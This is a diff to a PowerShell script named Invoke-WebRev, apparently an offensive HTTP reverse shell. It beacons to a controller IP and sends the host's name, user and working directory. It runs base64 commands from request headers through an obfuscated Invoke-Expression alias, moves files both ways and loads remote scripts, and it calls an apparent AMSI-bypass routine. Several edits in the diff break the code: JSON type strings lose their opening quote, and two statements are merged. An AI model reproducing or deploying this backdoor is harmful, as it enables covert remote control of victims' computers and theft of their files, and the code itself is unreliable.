@@ -1,46 +1,22 @@
-function Invoke-WebRev{
-    param
-    (
+function Invoke-WebRev {
+    [CmdletBinding()]
+    param(
         [string]$ip = "192.168.1.41",
         [string]$port = "8000",
         [switch]$ssl
     )
 
-    $help=@"
+    if(-not $ip -or -not $port) { return }
 
-.SYNOPSIS
-    WebRev.
-    PowerShell Function: Invoke-WebRev
-    Author: Hector de Armas (3v4Si0N)
-
-    Required Dependencies: Powershell >= v3.0
-    Optional Dependencies: None
-.DESCRIPTION
-    .
-
-.ARGUMENTS
-    -ip   <IP>      Remote Host
-    -port <PORT>    Remote Port
-    -ssl            Send traffic over ssl
-
-.EXAMPLE
-    Invoke-Webrev -ip 192.168.29.131 -port 80
-    Invoke-Webrev -ip 192.168.29.131 -port 443 -ssl
-"@
-
-    if(-not $ip -or -not $port) { return $help; }
-    
     if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
-    
+
     [array]$shurmano = "I","n","t","E","r","n","e","X" ;set-alias taleska-ei-vrixeka $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
-    
 
     $pwd_b64 = getPwd;
     $hname = toBase64 -str "$env:computername";
     $cuser = toBase64 -str "$env:username";
+    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}'
 
-    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
-    
     [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
     [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
     $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
@@ -50,6 +26,7 @@ function Invoke-WebRev{
     try { $error[0] = ""; } catch {}
 
     PatchMe;
+
     $previous_functions = (ls function:).Name;
     [array]$preloaded_functions = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream );
 
@@ -61,40 +38,38 @@ function Invoke-WebRev{
             $header = $req.Headers["Authorization"];
             $c = [System.Convert]::FromBase64String($header);
             $cstr = [System.Text.Encoding]::UTF8.GetString($c);
-            $result = "";
-            $dataToSend = "";
 
             if($cstr.split(" ")[0] -eq "autocomplete")
             {
                 $functs = (Get-Command | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream);
                 $functs = toBase64 -str "$functs";
-                $type = '"type":"4UT0C0MPL3T3"';
+                $type = 'type":"4UT0C0MPL3T3"';
                 $result = $functs;
             }
             elseif($cstr.split(" ")[0] -eq "upload")
             {
-                $type = '"type":"UPL04D"';
+                $type = 'type":"UPL04D"';
                 try
                 {
                     $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                     if ($cstr.split(" ").Length -eq 3) {
                         $location = $cstr.split(" ")[2];
                     }
-                    elseif ($cstr.Substring($cstr.Length-1) -eq '"') {
+                    elseif ($cstr.Substring($cstr.Length-1 ) -eq '"') {
                         $location = $cstr.split('"') | Select-Object -SkipLast 1 | Select-Object -Last 1;
                     }
                     else {
-                        $location = $cstr.split(' ') | Select-Object -Last 1;;
+                        $location = $cstr.split(' ') | Select-Object -Last 1;
                     }
                     $content = [System.Convert]::FromBase64String($uploadData);
-                    $content | Set-Content $location -Encoding Byte
+                    $content | Set-Content $location -Encoding Byte;
                     $result = '[+] File successfully uploaded.';
                 }
                 catch {}
             }
             elseif($cstr.split(" ")[0] -eq "download")
             {
-                $type = '"type":"D0WNL04D"';
+                $type = 'type":"D0WNL04D"';
                 try
                 {
                     if ($cstr.split(" ").Length -eq 3){
@@ -110,7 +85,7 @@ function Invoke-WebRev{
                         }
                         $pathDst = $cstr.split('"')[-2];
                     }
-                    else{
+                    else {
                         $pathSrc = $cstr.split('"')[1];
                         $pathDst = $cstr.split(' ')[-1];
                     }
@@ -119,12 +94,12 @@ function Invoke-WebRev{
                     {
                         $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                         $b64 = [System.Convert]::ToBase64String($downloadData);
-                        $result = '[+] File successfully downloaded.'
-                        $type = $type + ', "file":"' + $b64 + '", ' + '"pathDst":"' + $pathDst + '"';
+                        $result = '[+] File successfully downloaded.';
+                        $type = $type + ', "file":"' + $b64 + '", "pathDst":"' + $pathDst + '"';
                     } 
                     else
                     {
-                        $type = '"type":"3RR0R"';
+                        $type = 'type":"3RR0R"';
                         $result = '[!] Source file not found!';
                     }
                 }
@@ -132,7 +107,7 @@ function Invoke-WebRev{
             }
             elseif($cstr.split(" ")[0] -eq "loadps1")
             {
-                $type = '"type":"L04DPS1"';
+                $type = 'type":"L04DPS1"';
                 try
                 {
                     $loadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
@@ -141,17 +116,17 @@ function Invoke-WebRev{
                     $loadData = -join($loadData);
                     $content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($loadData));
                     taleska-ei-vrixeka $content | Out-String;
-                    $result = '[+] File loaded sucessfully.'
+                    $result = '[+] File loaded successfully.';
                 }
                 catch
                 {
-                    $type = '"type":"3RR0R"';
+                    $type = 'type":"3RR0R"';
                     $result = '[!] Error loading PS1!';
                 }
             }
             else
             {
-                $type = '"type":"C0MM4ND"';                
+                $type = 'type":"C0MM4ND"';                
                 $enc = [system.Text.Encoding]::UTF8;
                 $new = (taleska-ei-vrixeka $cstr | Out-String);
 
@@ -171,13 +146,13 @@ function Invoke-WebRev{
             {
                 try
                 {
-                    $type = '"type":"3RR0R"';
+                    $type = 'type":"3RR0R"';
                     $err = $error[0] | Out-String;
                     $error[0]= "";
 
                     $bytes = $enc.GetBytes($err);
                     $result = [Convert]::ToBase64String($bytes);
-                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}'
+                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
                 } catch {}
             }
         };
@@ -196,8 +171,7 @@ function toBase64
 
 function getPwd()
 {
-    $enc = [system.Text.Encoding]::UTF8;
-    $pwd = "pwd | Format-Table -HideTableHeaders";
+    $enc = [system.Text.Encoding]::UTF8 $pwd = "pwd | Format-Table -HideTableHeaders";
     $pwd_res = (taleska-ei-vrixeka $pwd | Out-String);
     $bytes = $enc.GetBytes($pwd_res);
     $pwd_b64 = [Convert]::ToBase64String($bytes);
@@ -216,7 +190,7 @@ function Get-ImportedFunctions
         $output = foreach ($new_function in $new_functions) { if ($preloaded_functions -notcontains $new_function) {"`n [+] $new_function"}}
         $menu = $menu + $output + "`n";
     } else {
-        [array]$new_functions = (ls function: | Where-Object {($_.name).Length -ge "4" -and $_.name -notlike "Close_*" -and $_.name -notlike "ReadData_*" -and $_.name -notlike "Setup_*" -and $_.name -notlike "Stream1_*" -and $_.name -notlike "WriteData_*" -and $_.name -notlike "Menu" -and $_.name -ne "f" -and $_.name -ne "func" -and $_.name -ne "Main" -and $_.name -ne "Main_Powershell"} | select-object name | format-table -HideTableHeaders | Out-String -Stream )
+        [array]$new_functions = (ls function: | Where-Object {($_.name).Length -ge "4" -and $_.name -notlike "Close_*" -and $_.name -notlike "ReadData_*" -and $_.name -notlike "Setup_*" -and $_.name -notlike "Stream1_*" -and $_.name -notlike "WriteData_*" -and $_.name -notlike "Menu" -and $_.name -ne "f" -and $_.name -ne "func" -and $_.name -ne "Main" -and $_.name -ne "Main_Powershell"} | select-object name | format-table -HideTableHeaders | Out-String )
         $show_functions = ($new_functions | where {$preloaded_functions -notcontains $_}) | foreach {"`n[+] $_"}
         $show_functions = $show_functions -replace "  ","" 
         $menu = $menu + $show_functions + "`n"
@@ -224,6 +198,8 @@ function Get-ImportedFunctions
     }
     return $menu;
 }
+
+
 
 function PatchMe
 {
